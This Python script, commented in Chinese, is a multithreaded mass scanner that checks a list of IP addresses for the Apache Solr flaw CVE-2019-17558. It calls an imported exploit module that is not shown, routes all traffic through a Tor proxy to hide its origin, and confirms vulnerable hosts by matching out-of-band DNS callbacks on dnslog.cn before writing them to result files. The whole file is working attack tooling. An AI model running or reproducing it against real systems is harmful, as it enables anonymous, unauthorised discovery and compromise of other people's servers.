# -*- coding: utf-8 -*-

import requests
import time
import base64
import json
import threading
import hashlib, random
import cve_2019_17558
requests.packages.urllib3.disable_warnings()

#------全局配置--------
target_path = 'ip_list.txt'
thread_num = 30
#此处proxies指向的是tor的socks5代理，注意安全
proxies = {'http':'socks5://192.168.111.130:9051','https':'socks5://192.168.111.130:9051'}
headers = {'User-Agent': 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0'}
session_dnslog = requests.Session()
f_result = open('result.txt','a+')
list_ip_hash = []
r = [] # dnslog record list
lock = threading.Lock()
#--------------------

'''
.. split_list_n_list(origin_list, n)
* 把列表origin_list中的元素平分为n个子列表
'''
def split_list_n_list(origin_list, n):
    try:
        if len(origin_list) % n == 0:
            cnt = len(origin_list) // n
        else:
            cnt = len(origin_list) // n + 1
        for i in range(0, n):
            yield origin_list[i*cnt:(i+1)*cnt]
    except Exception as e:
        print(e)

'''
getdomain()
* 从dnslog.cn获取一个新域名，之后用来做漏洞验证
'''
def getdomain():
    try :
        domain = session_dnslog.get("http://www.dnslog.cn/getdomain.php?t="+str(random.randint(100000,999999)),timeout=10,proxies=proxies,headers=headers).text
        return domain
    except Exception as e:
        print("getdomain error:" + str(e))
    

'''
getrecord()
* 从dnslog.cn获取任意访问xxx.dnslog.cn的历史记录("xxx.dnslog.cn"是getdomain()获取到的)
'''
def getrecord():
    try :
        record = session_dnslog.get("http://www.dnslog.cn/getrecords.php?t="+str(random.randint(100000,999999)),timeout=10,proxies=proxies,headers=headers).text
        return json.loads(record)
    except Exception as e:
        print("getrecord error:" + str(e))

    

'''
get_hash_list(target_path)
* 读取目标集文件，更新并返回ip-hash列表
'''
def get_hash_list(target_path):
    f1 = open(target_path,'r', encoding='utf-8')
    iplist = f1.readlines()
    if iplist[-1] == '\n':
        iplist = iplist[:-1]
    f1.close()
    for host in iplist :
        #print(host)
        list_ip_hash.append([host[:-1], hashlib.md5(host[:-1].encode('utf-8')).hexdigest()]) 
    return list_ip_hash

'''
update_record()
* 访问dnslog.cn，更新record列表
'''
def update_record():
    try :
        global r
        lock.acquire()
        r = getrecord()
        with open('tmp_record.txt','w') as f:
            for i in r :
                for x in i:
                    f.write(x.strip() + '\t')
                f.write('\n')
        lock.release()
    except Exception as e :
        time.sleep(10)
        lock.release()
        update_record()
'''
function t_watchdog()
* 每20秒从dnslog.cn获取一次域名的访问记录，并检测当存活线程为2个时（仅剩下主线程和t_watchdog线程时），结束程序
'''
def t_watchdog():
    while True:
        if threading.active_count() == 2 :
            update_record()
            save_result()
            break
        else : 
            update_record()
            time.sleep(20)

'''
save_result()
* 把hash列表、域名访问记录、核对过的含有漏洞的目标列表保存到本地
'''
def save_result():
    str_record = str(r)
    #把ip-hash表中的hash 和 record列表中被访问的域名进行比较，取出ip-hash表和record表共有的那一部分
    list_result = [x for x in list_ip_hash if x[1] in str_record ] 
    # 对结果进行去重
    c_list_result = [list(t) for t in set(tuple(_) for _ in list_result)]
    c_list_result.sort(key=list_result.index)

    print("\n############################################\nresult:\n")
    for i in c_list_result :
        for x in i:
            print(x.strip()+'\t')
        print('\n')
    #保存到本地
    d = list(time.localtime())
    date = str(d[0]) + '-' + str(d[1]) + '-' + str(d[2]) + '-' +str(d[3]) + '-' +str(d[4]) + '-' +str(d[5])
    with open('hash-'+ date + '.txt','a+') as f:
        for i in list_ip_hash:
            #f.write("\t".join(i)+'\n')
            f.write(i[0]+'\n')
    with open('record-' + date + '.txt','w') as f:
        for i in r :
            f.write(str(i)+'\n')
    # result保存的是核对过的含有漏洞的目标列表
    with open('result-'+ date + '.txt','a+') as f:
        for i in c_list_result:
            #f.write("\t".join(i)+'\n')
            f.write(i[0]+'\n') 

if __name__ == '__main__':
    # 生成ip-hash表
    get_hash_list(target_path) 
    # ip-hash表进行均等拆分后（均分为thread_num份）放到 list_target，这个list_target是个generator
    list_target = split_list_n_list(list_ip_hash,thread_num) 
    # generator转list
    list_target = list(list_target) 
    #从dnslog.cn获取一个新域名
    vdomain = getdomain()
    print(vdomain)
    # 域名生效要一点时间
    time.sleep(10)

    thread_list = []
    # exp相关的运行线程
    for i in range(thread_num):
        # 传入的参数list_target[i]值为均分后的ip-hash列表, vdomain为从dnslog.cn获取到的域名
        t = threading.Thread(target=cve_2019_17558._verify,args=(list_target[i], vdomain)) 
        thread_list.append(t)

    # 监控线程
    dog = threading.Thread(target=t_watchdog)
    thread_list.append(dog)
   
    #启动线程
    for i in range(thread_num + 1):
        thread_list[i].setDaemon(True)
        thread_list[i].start()
    for i in range(thread_num + 1):
        thread_list[i].join()
